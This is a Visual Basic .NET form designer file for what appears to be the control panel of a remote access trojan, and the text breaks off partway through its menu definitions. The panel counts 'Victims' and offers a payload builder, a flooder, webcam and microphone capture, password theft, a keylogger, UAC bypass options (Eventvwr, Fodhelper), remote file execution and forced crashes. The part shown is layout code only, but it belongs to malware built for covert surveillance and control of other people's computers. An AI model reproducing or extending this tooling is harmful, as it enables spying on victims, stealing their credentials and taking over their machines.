﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Dim DataGridViewCellStyle1 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Dim DataGridViewCellStyle2 As System.Windows.Forms.DataGridViewCellStyle = New System.Windows.Forms.DataGridViewCellStyle()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel4 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel11 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel5 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel9 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel10 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel14 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ATKStripStatusLabel10 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel12 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel8 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel18 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.conz = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel17 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel15 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel16 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.upl = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel13 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.dwn = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel6 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel7 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabels5 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromLinkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScriptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteCamToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MicrophoneToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GetPasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FunToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScreamerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LockToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UnlockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UACToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EventvwrToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RunAsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FodhelperToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScheduledTasksToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScheduleTasksToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteScheduledTasksToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenChatToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogoffToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDISKToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromLINKToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisconnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OpenFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.IMG2 = New System.Windows.Forms.ImageList(Me.components)
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.ContextMenuStrip2 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ShowToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExitToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.L1 = New L1()
        Me.Pp1 = New Pp1()
        Me.TriggerBSODToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StatusStrip1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.ContextMenuStrip2.SuspendLayout()
        CType(Me.L1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.Pp1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.Black
        Me.StatusStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel4, Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel11, Me.ToolStripStatusLabel5, Me.ToolStripStatusLabel9, Me.ToolStripStatusLabel3, Me.ToolStripStatusLabel10, Me.ToolStripStatusLabel2, Me.ToolStripStatusLabel14, Me.ATKStripStatusLabel10, Me.ToolStripStatusLabel12, Me.ToolStripStatusLabel8, Me.ToolStripStatusLabel18, Me.conz, Me.ToolStripStatusLabel17, Me.ToolStripStatusLabel15, Me.ToolStripStatusLabel16, Me.upl, Me.ToolStripStatusLabel13, Me.dwn, Me.ToolStripStatusLabel6, Me.ToolStripStatusLabel7, Me.ToolStripStatusLabels5})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 339)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.StatusStrip1.Size = New System.Drawing.Size(967, 22)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 0
        Me.StatusStrip1.Tag = "1"
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel4
        '
        Me.ToolStripStatusLabel4.Image = CType(resources.GetObject("ToolStripStatusLabel4.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel4.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4"
        Me.ToolStripStatusLabel4.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel1.IsLink = True
        Me.ToolStripStatusLabel1.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(49, 17)
        Me.ToolStripStatusLabel1.Tag = "1"
        Me.ToolStripStatusLabel1.Text = "[ Logs ]"
        '
        'ToolStripStatusLabel11
        '
        Me.ToolStripStatusLabel11.Image = CType(resources.GetObject("ToolStripStatusLabel11.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel11.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel11.Name = "ToolStripStatusLabel11"
        Me.ToolStripStatusLabel11.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel5
        '
        Me.ToolStripStatusLabel5.Font = New System.Drawing.Font("Arial", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Underline), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel5.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel5.IsLink = True
        Me.ToolStripStatusLabel5.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5"
        Me.ToolStripStatusLabel5.Size = New System.Drawing.Size(60, 17)
        Me.ToolStripStatusLabel5.Text = "[ Builder ]"
        Me.ToolStripStatusLabel5.VisitedLinkColor = System.Drawing.Color.White
        '
        'ToolStripStatusLabel9
        '
        Me.ToolStripStatusLabel9.Image = CType(resources.GetObject("ToolStripStatusLabel9.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel9.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel9.Name = "ToolStripStatusLabel9"
        Me.ToolStripStatusLabel9.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel3.IsLink = True
        Me.ToolStripStatusLabel3.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(67, 17)
        Me.ToolStripStatusLabel3.Text = "[ Settings ]"
        '
        'ToolStripStatusLabel10
        '
        Me.ToolStripStatusLabel10.Image = CType(resources.GetObject("ToolStripStatusLabel10.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel10.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel10.Name = "ToolStripStatusLabel10"
        Me.ToolStripStatusLabel10.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel2.IsLink = True
        Me.ToolStripStatusLabel2.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(77, 17)
        Me.ToolStripStatusLabel2.Text = "[ Assembly ]"
        '
        'ToolStripStatusLabel14
        '
        Me.ToolStripStatusLabel14.Image = CType(resources.GetObject("ToolStripStatusLabel14.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel14.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel14.Name = "ToolStripStatusLabel14"
        Me.ToolStripStatusLabel14.Size = New System.Drawing.Size(16, 17)
        '
        'ATKStripStatusLabel10
        '
        Me.ATKStripStatusLabel10.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ATKStripStatusLabel10.ForeColor = System.Drawing.Color.White
        Me.ATKStripStatusLabel10.IsLink = True
        Me.ATKStripStatusLabel10.LinkColor = System.Drawing.Color.White
        Me.ATKStripStatusLabel10.Name = "ATKStripStatusLabel10"
        Me.ATKStripStatusLabel10.Size = New System.Drawing.Size(63, 17)
        Me.ATKStripStatusLabel10.Text = "[ Flooder ]"
        '
        'ToolStripStatusLabel12
        '
        Me.ToolStripStatusLabel12.Image = CType(resources.GetObject("ToolStripStatusLabel12.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel12.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel12.Name = "ToolStripStatusLabel12"
        Me.ToolStripStatusLabel12.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel8
        '
        Me.ToolStripStatusLabel8.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel8.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel8.IsLink = True
        Me.ToolStripStatusLabel8.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel8.Name = "ToolStripStatusLabel8"
        Me.ToolStripStatusLabel8.Size = New System.Drawing.Size(54, 17)
        Me.ToolStripStatusLabel8.Text = "[ About ]"
        '
        'ToolStripStatusLabel18
        '
        Me.ToolStripStatusLabel18.Image = CType(resources.GetObject("ToolStripStatusLabel18.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel18.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel18.Name = "ToolStripStatusLabel18"
        Me.ToolStripStatusLabel18.Size = New System.Drawing.Size(26, 17)
        Me.ToolStripStatusLabel18.Text = " "
        Me.ToolStripStatusLabel18.TextImageRelation = System.Windows.Forms.TextImageRelation.TextBeforeImage
        '
        'conz
        '
        Me.conz.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.conz.ForeColor = System.Drawing.Color.White
        Me.conz.Name = "conz"
        Me.conz.Size = New System.Drawing.Size(94, 17)
        Me.conz.Text = "Connections [0]"
        '
        'ToolStripStatusLabel17
        '
        Me.ToolStripStatusLabel17.Image = CType(resources.GetObject("ToolStripStatusLabel17.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel17.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel17.Name = "ToolStripStatusLabel17"
        Me.ToolStripStatusLabel17.Size = New System.Drawing.Size(16, 17)
        '
        'ToolStripStatusLabel15
        '
        Me.ToolStripStatusLabel15.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel15.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabel15.Name = "ToolStripStatusLabel15"
        Me.ToolStripStatusLabel15.Size = New System.Drawing.Size(66, 17)
        Me.ToolStripStatusLabel15.Text = "Victims [0]"
        '
        'ToolStripStatusLabel16
        '
        Me.ToolStripStatusLabel16.Image = CType(resources.GetObject("ToolStripStatusLabel16.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel16.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel16.Name = "ToolStripStatusLabel16"
        Me.ToolStripStatusLabel16.Size = New System.Drawing.Size(16, 17)
        '
        'upl
        '
        Me.upl.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.upl.ForeColor = System.Drawing.Color.White
        Me.upl.Name = "upl"
        Me.upl.Size = New System.Drawing.Size(95, 17)
        Me.upl.Text = "Upload [0 Bytes]"
        '
        'ToolStripStatusLabel13
        '
        Me.ToolStripStatusLabel13.Image = CType(resources.GetObject("ToolStripStatusLabel13.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel13.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ToolStripStatusLabel13.Name = "ToolStripStatusLabel13"
        Me.ToolStripStatusLabel13.Size = New System.Drawing.Size(16, 17)
        '
        'dwn
        '
        Me.dwn.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.dwn.ForeColor = System.Drawing.Color.White
        Me.dwn.Name = "dwn"
        Me.dwn.Size = New System.Drawing.Size(112, 17)
        Me.dwn.Text = "Download [0 Bytes]"
        '
        'ToolStripStatusLabel6
        '
        Me.ToolStripStatusLabel6.Name = "ToolStripStatusLabel6"
        Me.ToolStripStatusLabel6.Size = New System.Drawing.Size(119, 17)
        Me.ToolStripStatusLabel6.Text = "ToolStripStatusLabel6"
        '
        'ToolStripStatusLabel7
        '
        Me.ToolStripStatusLabel7.Name = "ToolStripStatusLabel7"
        Me.ToolStripStatusLabel7.Size = New System.Drawing.Size(119, 15)
        Me.ToolStripStatusLabel7.Text = "ToolStripStatusLabel7"
        '
        'ToolStripStatusLabels5
        '
        Me.ToolStripStatusLabels5.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabels5.ForeColor = System.Drawing.Color.White
        Me.ToolStripStatusLabels5.IsLink = True
        Me.ToolStripStatusLabels5.LinkColor = System.Drawing.Color.White
        Me.ToolStripStatusLabels5.Name = "ToolStripStatusLabels5"
        Me.ToolStripStatusLabels5.Size = New System.Drawing.Size(0, 0)
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.SystemColors.ActiveCaptionText
        Me.ContextMenuStrip1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ManagerToolStripMenuItem, Me.RunFileToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.RemoteCamToolStripMenuItem, Me.MicrophoneToolStripMenuItem, Me.GetPasswordsToolStripMenuItem, Me.FunToolStripMenuItem, Me.ScreamerToolStripMenuItem, Me.TriggerBSODToolStripMenuItem, Me.LockToolStripMenuItem, Me.UACToolStripMenuItem, Me.ScheduledTasksToolStripMenuItem, Me.KeyloggerToolStripMenuItem, Me.OpenChatToolStripMenuItem, Me.PCToolStripMenuItem, Me.ServerToolStripMenuItem, Me.OpenFolderToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(169, 400)
        '
        'ManagerToolStripMenuItem
        '
        Me.ManagerToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ManagerToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ManagerToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ManagerToolStripMenuItem.Image = CType(resources.GetObject("ManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ManagerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ManagerToolStripMenuItem.Name = "ManagerToolStripMenuItem"
        Me.ManagerToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.ManagerToolStripMenuItem.Text = "Manager"
        '
        'RunFileToolStripMenuItem
        '
        Me.RunFileToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RunFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromLinkToolStripMenuItem, Me.FromDiskToolStripMenuItem, Me.ScriptToolStripMenuItem})
        Me.RunFileToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RunFileToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RunFileToolStripMenuItem.Image = CType(resources.GetObject("RunFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RunFileToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem"
        Me.RunFileToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RunFileToolStripMenuItem.Text = "Run File"
        '
        'FromLinkToolStripMenuItem
        '
        Me.FromLinkToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.FromLinkToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.FromLinkToolStripMenuItem.Image = CType(resources.GetObject("FromLinkToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromLinkToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem"
        Me.FromLinkToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.FromLinkToolStripMenuItem.Text = "From Link"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.FromDiskToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.FromDiskToolStripMenuItem.Image = CType(resources.GetObject("FromDiskToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromDiskToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.FromDiskToolStripMenuItem.Text = "From Disk"
        '
        'ScriptToolStripMenuItem
        '
        Me.ScriptToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ScriptToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ScriptToolStripMenuItem.Image = CType(resources.GetObject("ScriptToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScriptToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ScriptToolStripMenuItem.Name = "ScriptToolStripMenuItem"
        Me.ScriptToolStripMenuItem.Size = New System.Drawing.Size(130, 22)
        Me.ScriptToolStripMenuItem.Text = "Script"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RemoteDesktopToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RemoteDesktopToolStripMenuItem.Image = CType(resources.GetObject("RemoteDesktopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteDesktopToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'RemoteCamToolStripMenuItem
        '
        Me.RemoteCamToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.RemoteCamToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RemoteCamToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.RemoteCamToolStripMenuItem.Image = CType(resources.GetObject("RemoteCamToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteCamToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.RemoteCamToolStripMenuItem.Name = "RemoteCamToolStripMenuItem"
        Me.RemoteCamToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.RemoteCamToolStripMenuItem.Text = "Remote Cam"
        '
        'MicrophoneToolStripMenuItem
        '
        Me.MicrophoneToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.MicrophoneToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.MicrophoneToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.MicrophoneToolStripMenuItem.Image = CType(resources.GetObject("MicrophoneToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MicrophoneToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.MicrophoneToolStripMenuItem.Name = "MicrophoneToolStripMenuItem"
        Me.MicrophoneToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.MicrophoneToolStripMenuItem.Text = "Microphone"
        '
        'GetPasswordsToolStripMenuItem
        '
        Me.GetPasswordsToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.GetPasswordsToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GetPasswordsToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.GetPasswordsToolStripMenuItem.Image = CType(resources.GetObject("GetPasswordsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GetPasswordsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.GetPasswordsToolStripMenuItem.Name = "GetPasswordsToolStripMenuItem"
        Me.GetPasswordsToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.GetPasswordsToolStripMenuItem.Text = "Passwords"
        '
        'FunToolStripMenuItem
        '
        Me.FunToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.FunToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.FunToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.FunToolStripMenuItem.Image = CType(resources.GetObject("FunToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FunToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.FunToolStripMenuItem.Name = "FunToolStripMenuItem"
        Me.FunToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.FunToolStripMenuItem.Text = "Fun"
        '
        'ScreamerToolStripMenuItem
        '
        Me.ScreamerToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.ScreamerToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ScreamerToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.ScreamerToolStripMenuItem.Image = CType(resources.GetObject("ScreamerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScreamerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.ScreamerToolStripMenuItem.Name = "ScreamerToolStripMenuItem"
        Me.ScreamerToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.ScreamerToolStripMenuItem.Text = "Screamer"
        '
        'LockToolStripMenuItem
        '
        Me.LockToolStripMenuItem.BackColor = System.Drawing.Color.Black
        Me.LockToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LockToolStripMenuItem1, Me.UnlockToolStripMenuItem})
        Me.LockToolStripMenuItem.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LockToolStripMenuItem.ForeColor = System.Drawing.Color.White
        Me.LockToolStripMenuItem.Image = CType(resources.GetObject("LockToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LockToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
